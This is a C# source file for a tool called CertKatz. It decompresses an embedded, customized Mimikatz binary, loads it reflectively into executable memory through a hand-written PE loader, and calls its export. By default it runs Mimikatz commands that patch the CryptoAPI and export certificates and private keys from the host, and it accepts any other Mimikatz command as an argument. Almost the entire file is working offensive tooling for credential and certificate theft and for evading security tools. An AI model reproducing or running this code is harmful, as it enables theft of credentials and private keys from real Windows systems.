﻿using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.IO.Compression;

namespace CertKatz
{
    class Program
    {
        // adapted from https://blogs.msdn.microsoft.com/dondu/2010/10/24/writing-minidumps-in-c/

        // overload supporting MiniDumpExceptionInformation == NULL
       
        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static IntPtr codebase = IntPtr.Zero;

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool main(IntPtr arg1, uint arg2, IntPtr lparam);


        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr m(IntPtr command);

        private static unsafe IntPtr GetFuncExport(PELoader pe, string funcName)
        {
            IntPtr ExportTablePtr = IntPtr.Zero;
            PELoader.IMAGE_EXPORT_DIRECTORY expDir;

            if (pe.Is32BitHeader && pe.OptionalHeader32.ExportTable.Size == 0)
                return IntPtr.Zero;
            else if (!pe.Is32BitHeader && pe.OptionalHeader64.ExportTable.Size == 0)
                return IntPtr.Zero;

            if (pe.Is32BitHeader)
                ExportTablePtr = (IntPtr)((ulong)codebase + (ulong)pe.OptionalHeader32.ExportTable.VirtualAddress);
            else
                ExportTablePtr = (IntPtr)((ulong)codebase + (ulong)pe.OptionalHeader64.ExportTable.VirtualAddress);

            expDir = (PELoader.IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(ExportTablePtr, typeof(PELoader.IMAGE_EXPORT_DIRECTORY));

            for (int i = 0; i < expDir.NumberOfNames; i++)
            {
                IntPtr NameOffsetPtr = (IntPtr)((ulong)codebase + (ulong)expDir.AddressOfNames);
                NameOffsetPtr = (IntPtr)((ulong)NameOffsetPtr + (ulong)(i * Marshal.SizeOf(typeof(uint))));
                IntPtr NamePtr = (IntPtr)((ulong)codebase + (uint)Marshal.PtrToStructure(NameOffsetPtr, typeof(uint)));

                string Name = Marshal.PtrToStringAnsi(NamePtr);

                if (Name.Contains(funcName))
                {
                    IntPtr AddressOfFunctions = (IntPtr)((ulong)codebase + (ulong)expDir.AddressOfFunctions);
                    IntPtr OrdinalRvaPtr = (IntPtr)((ulong)codebase + (ulong)(expDir.AddressOfOrdinals + (i * Marshal.SizeOf(typeof(UInt16)))));
                    UInt16 FuncIndex = (UInt16)Marshal.PtrToStructure(OrdinalRvaPtr, typeof(UInt16));
                    IntPtr FuncOffsetLocation = (IntPtr)((ulong)AddressOfFunctions + (ulong)(FuncIndex * Marshal.SizeOf(typeof(UInt32))));
                    IntPtr FuncLocationInMemory = (IntPtr)((ulong)codebase + (uint)Marshal.PtrToStructure(FuncOffsetLocation, typeof(UInt32)));

                    return FuncLocationInMemory;
                }
            }

            return IntPtr.Zero;
        }

        static void Main(string[] args)
        {
            if (!IsHighIntegrity())
            {
                Console.WriteLine("\n[X] Not in high integrity, unable to grab a handle to lsass!\n");
            }
            else
            {
                

                // now decompress the customized Mimikatz binary from Constants.cs
                Byte[] unpacked = new byte[392192];
                using (MemoryStream inputStream = new MemoryStream(Convert.FromBase64String(Constants.compressedMimikatzString)))
                {
                    using (DeflateStream stream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        stream.Read(unpacked, 0, 392192);
                    }
                }

                // start of @subtee's PE loader

                PELoader pe = new PELoader(unpacked);
                
                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);

        //        // copy Sections
                for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
                {
                    IntPtr y = NativeDeclarations.VirtualAlloc((IntPtr)((long)(codebase.ToInt64() + (int)pe.ImageSectionHeaders[i].VirtualAddress)), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                }

                // perform Base Relocation
                long currentbase = (long)codebase.ToInt64();
                long delta;

                delta = (long)(currentbase - (long)pe.OptionalHeader64.ImageBase);

                // Modify Memory Based On Relocation Table
                IntPtr relocationTable = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));
                NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

                int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
                IntPtr nextEntry = relocationTable;
                int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
                IntPtr offset = relocationTable;

                while (true)
                {
                    NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                    IntPtr x = (IntPtr)((long)(relocationTable.ToInt64() + (int)sizeofNextBlock));

                    relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

                    IntPtr dest = (IntPtr)((long)(codebase.ToInt64() + (int)relocationEntry.VirtualAdress));

                    for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                    {
                        IntPtr patchAddr;
                        UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));

                        UInt16 type = (UInt16)(value >> 12);
                        UInt16 fixup = (UInt16)(value & 0xfff);

                        switch (type)
                        {
                            case 0x0:
                                break;
                            case 0xA:
                                patchAddr = (IntPtr)((long)(dest.ToInt64() + (int)fixup));
                                // Add Delta To Location
                                long originalAddr = Marshal.ReadInt64(patchAddr);
                                Marshal.WriteInt64(patchAddr, originalAddr + delta);
                                break;
                        }
                    }

                    offset = (IntPtr)((long)(relocationTable.ToInt64() + (int)sizeofNextBlock));
                    sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                    relocationEntry = relocationNextEntry;

                    nextEntry = (IntPtr)((long)(nextEntry.ToInt64() + (int)sizeofNextBlock));

                    if (relocationNextEntry.SizeOfBlock == 0) break;
                }


                // Resolve Imports

                IntPtr z = (IntPtr)((long)(codebase.ToInt64() + (int)pe.ImageSectionHeaders[1].VirtualAddress));
                IntPtr oa1 = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.ImportTable.VirtualAddress));

                int oa2 = Marshal.ReadInt32((IntPtr)((long)(oa1.ToInt64() + (int)16)));

                // Get And Display Each DLL To Load
                for (int j = 0; j < 999; j++) // HardCoded Number of DLL's - ideally do this Dynamically.
                {
                    IntPtr a1 = (IntPtr)((long)(codebase.ToInt64() + (uint)(20 * j) + (uint)pe.OptionalHeader64.ImportTable.VirtualAddress));

                    int entryLength = Marshal.ReadInt32((IntPtr)(((long)a1.ToInt64() + (long)16)));

                    IntPtr a2 = (IntPtr)((long)(codebase.ToInt64() + (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)));

                    int temp = Marshal.ReadInt32((IntPtr)((long)(a1.ToInt64() + (int)12)));
                    IntPtr dllNamePTR = (IntPtr)((long)(codebase.ToInt64() + temp));

                    string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                    if (DllName == "") { break; }

                    IntPtr handle = NativeDeclarations.LoadLibrary(DllName);

                    for (int k = 1; k < 9999; k++)
                    {
                        IntPtr dllFuncNamePTR = (IntPtr)((long)(codebase.ToInt64() + Marshal.ReadInt32(a2)));

                        string DllFuncName = Marshal.PtrToStringAnsi((IntPtr)((long)(dllFuncNamePTR.ToInt64() + (int)2)));
                        IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                        Marshal.WriteInt64(a2, (long)funcAddy);
                        a2 = (IntPtr)((long)(a2.ToInt64() + 8));
                        if (DllFuncName == "") break;
                    }
                }

                // Transfer Control To OEP
                Console.WriteLine("\n[*] Executing loaded Mimikatz PE");

                IntPtr threadStart = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.AddressOfEntryPoint));
                main dllmain = (main) Marshal.GetDelegateForFunctionPointer(threadStart, typeof(main));
                dllmain(codebase, 1, IntPtr.Zero);

                IntPtr output;
                IntPtr powerkatzPtr = GetFuncExport(pe, "powershell_reflective_mimikatz");
                
                m mimikatz = (m) Marshal.GetDelegateForFunctionPointer(powerkatzPtr, typeof(m));

                IntPtr input;
                if (args.Length == 0)
                {
                    input = Marshal.StringToHGlobalUni("crypto::capi \"crypto::certificates /export\"");
                }
                else
                {
                    string inputCmd = "";
                    for (int i = 0; i < args.Length; i++)
                    {
                        inputCmd += $"{args[i]} ";
                    }
                    input = Marshal.StringToHGlobalUni(inputCmd);
                   
                }

                output = mimikatz(input);
                string results = Marshal.PtrToStringUni(output);
                Console.Write(results);



            }
        }
    }


    public class PELoader
    {
        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Explicit)]
        public unsafe struct IMAGE_EXPORT_DIRECTORY
        {
            [FieldOffset(0)]
            public UInt32 Characteristics;
            [FieldOffset(4)]
            public UInt32 TimeDateStamp;
            [FieldOffset(8)]
            public UInt16 MajorVersion;
            [FieldOffset(10)]
            public UInt16 MinorVersion;
            [FieldOffset(12)]
            public UInt32 Name;
            [FieldOffset(16)]
            public UInt32 Base;
            [FieldOffset(20)]
            public UInt32 NumberOfFunctions;
            [FieldOffset(24)]
            public UInt32 NumberOfNames;
            [FieldOffset(28)]
            public UInt32 AddressOfFunctions;
            [FieldOffset(32)]
            public UInt32 AddressOfNames;
            [FieldOffset(36)]
            public UInt32 AddressOfOrdinals;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {
            Stub = 0x00000000,
        }


        /// The DOS header

        private IMAGE_DOS_HEADER dosHeader;

        /// The file header

        private IMAGE_FILE_HEADER fileHeader;

        /// Optional 32 bit file header 

        private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

        /// Optional 64 bit file header 

        private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

        /// Image Section headers. Number of sections is in the file header.

        private IMAGE_SECTION_HEADER[] imageSectionHeaders;

        private byte[] rawbytes;


        public PELoader(string filePath)
        {
            // Read in the DLL or EXE and get the timestamp
            using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }


                rawbytes = System.IO.File.ReadAllBytes(filePath);
            }
        }

        public PELoader(byte[] fileBytes)
        {
            // Read in the DLL or EXE and get the timestamp
            using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }

                rawbytes = fileBytes;
            }
        }


        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }


        public bool Is32BitHeader
        {
            get
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }


        public IMAGE_FILE_HEADER FileHeader
        {
            get
            {
                return fileHeader;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
        {
            get
            {
                return optionalHeader32;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
        {
            get
            {
                return optionalHeader64;
            }
        }

        public IMAGE_SECTION_HEADER[] ImageSectionHeaders
        {
            get
            {
                return imageSectionHeaders;
            }
        }

        public byte[] RawBytes
        {
            get
            {
                return rawbytes;
            }

        }

    }//End Class


    unsafe class NativeDeclarations
    {

        public static uint MEM_COMMIT = 0x1000;
        public static uint MEM_RESERVE = 0x2000;
        public static uint PAGE_EXECUTE_READWRITE = 0x40;
        public static uint PAGE_READWRITE = 0x04;

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(

          IntPtr lpThreadAttributes,
          uint dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          uint dwCreationFlags,
          IntPtr lpThreadId
          );

        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }
    }
}
